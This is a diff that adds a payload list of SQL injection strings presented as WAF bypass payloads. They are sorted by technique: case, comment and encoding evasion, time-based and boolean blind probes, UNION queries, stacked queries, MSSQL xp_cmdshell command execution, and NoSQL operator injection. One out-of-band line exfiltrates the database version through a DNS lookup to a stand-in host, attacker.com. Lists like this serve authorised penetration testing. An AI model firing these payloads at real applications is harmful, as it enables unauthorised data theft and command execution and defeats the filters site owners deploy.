@@ -1,0 +1,117 @@
+# ============================================================================
+# SQL INJECTION - WAF BYPASS PAYLOADS
+# ============================================================================
+# These bypass common WAF rules that block standard SQLi payloads
+# ============================================================================
+
+# Case Manipulation
+' oR '1'='1
+' Or '1'='1
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+
+# Comment Injection
+'/**/OR/**/1=1--
+'+OR+1=1--
+'--/**/OR/**/1=1
+'/*!50000OR*/1=1--
+'/*!OR*/1=1--
+
+# Encoding Tricks (URL Encoded)
+%27%20OR%201=1--
+%27%20OR%20%271%27=%271
+%2527%20OR%201=1--
+%252527%20OR%201=1--
+
+# Unicode/Double Encode
+%u0027%20OR%201=1--
+%c0%27%20OR%201=1--
+
+# No Spaces (Using Comments)
+'OR(1=1)--
+'+OR+(1=1)--
+'OR/**/1=1--
+'||1=1--
+'&&1=1--
+
+# String Concat Bypass
+'OR''='
+'OR'x'='x
+'OR'1'LIKE'1
+
+# CASE WHEN
+' OR CASE WHEN 1=1 THEN 1 ELSE 0 END--
+
+# Scientific Notation
+' OR 1e0=1e0--
+' OR 1.0=1.0--
+
+# Null Byte Injection
+'%00OR 1=1--
+%00'OR 1=1--
+
+# Time-Based (Blind)
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+' AND BENCHMARK(10000000,SHA1('test'))--
+'; WAITFOR DELAY '0:0:5'--
+' || pg_sleep(5)--
+
+# Time-Based (Comments to bypass)
+'/**/AND/**/SLEEP(5)--
+'+AND+SLEEP(5)--
+
+# Boolean-Based
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+
+# Order By
+1' ORDER BY 1--
+1' ORDER BY 10--
+1' ORDER BY 100--
+
+# Union Based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT 1,2,3--
+1' UNION SELECT 1,2,3--+
+
+# Union with WAF Bypass
+'/**/UNION/**/SELECT/**/NULL--
+'+UNION+SELECT+NULL--
+' UnIoN SeLeCt NULL--
+' /*!50000UNION*/ /*!50000SELECT*/ NULL--
+
+# Stacked Queries
+'; SELECT 1--
+'; INSERT INTO log VALUES(1)--
+
+# MSsQL Specific
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC master..xp_cmdshell 'whoami'--
+
+# PostgreSQL Specific
+'; SELECT version()--
+' || (SELECT version())--
+
+# MySQL Specific
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+
+# Out of Band
+' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
+
+# JSON Injection
+{"$gt":""}
+{"$ne":""}
+{"$regex":".*"}
+
+# NoSQL MongoDB
+' || '1'=='1
+'; return true; //
